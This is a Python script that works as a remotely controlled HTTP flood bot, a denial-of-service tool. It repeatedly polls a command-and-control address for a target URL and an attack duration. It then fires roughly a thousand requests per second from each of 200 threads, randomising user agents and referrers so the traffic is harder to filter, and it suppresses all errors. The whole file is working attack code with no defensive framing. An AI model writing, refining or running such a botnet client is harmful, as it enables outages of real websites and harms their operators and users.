import aiohttp
import asyncio
import time
import xml.etree.ElementTree as ET
from fake_useragent import UserAgent
import random
import sys
from concurrent.futures import ThreadPoolExecutor
import threading

MAX_REQUESTS_PER_SECOND = 1000
THREADS_PER_INSTANCE = 200  # عدد الخيوط لكل مثيل
BATCH_SIZE = 25  # حجم الدفعة لكل خيط

REFERRERS = [
    'https://www.google.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.linkedin.com/',
    'https://www.youtube.com/',
    'https://www.wikipedia.org/'
]

EXTRA_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1'
}

def get_random_headers():
    ua = UserAgent()
    headers = {
        'User-Agent': ua.random,
        'Referer': random.choice(REFERRERS),
        **EXTRA_HEADERS
    }
    return headers

async def send_request(session, url):
    headers = get_random_headers()
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=0.5)):
            pass
    except Exception:
        pass

async def get_instructions():
    api_url = 'http://nrcf.medianewsonline.com/api/index.php'
    headers = get_random_headers()
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers=headers) as response:
                if response.status == 200:
                    xml_data = await response.text()
                    if xml_data:
                        try:
                            root = ET.fromstring(xml_data)
                            url = root.find('url').text
                            time_limit = int(root.find('time').text)
                            return url, time_limit
                        except ET.ParseError:
                            return None, None
                    else:
                        return None, None
                else:
                    return None, None
    except Exception:
        return None, None

async def send_batch(session, url, batch_size):
    tasks = [send_request(session, url) for _ in range(batch_size)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def send_requests_in_batch(url, duration):
    connector = aiohttp.TCPConnector(limit=THREADS_PER_INSTANCE * 10, ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        start_time = time.time()
        end_time = start_time + duration
        total_requests = 0

        while time.time() < end_time:
            batch_start = time.time()
            batches = [send_batch(session, url, BATCH_SIZE) for _ in range(MAX_REQUESTS_PER_SECOND // BATCH_SIZE)]
            await asyncio.gather(*batches, return_exceptions=True)
            total_requests += MAX_REQUESTS_PER_SECOND

            elapsed_time = time.time() - batch_start
            requests_per_second = MAX_REQUESTS_PER_SECOND / elapsed_time if elapsed_time > 0 else 0
            
            sys.stdout.write(f"\rRequests per second: {requests_per_second:.2f}")
            sys.stdout.flush()

            if elapsed_time < 1:
                await asyncio.sleep(1 - elapsed_time)

def run_instance(url, duration):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(send_requests_in_batch(url, duration))
    loop.close()

def run_in_threads(url, duration):
    with ThreadPoolExecutor(max_workers=THREADS_PER_INSTANCE) as executor:
        futures = [executor.submit(run_instance, url, duration) for _ in range(THREADS_PER_INSTANCE)]
        for future in futures:
            future.result()  # انتظار اكتمال الخيوط

if __name__ == "__main__":
    while True:
        url, duration = asyncio.run(get_instructions())
        if url and duration:
            threading.Thread(target=run_in_threads, args=(url, duration), daemon=True).start()
        else:
            time.sleep(10)
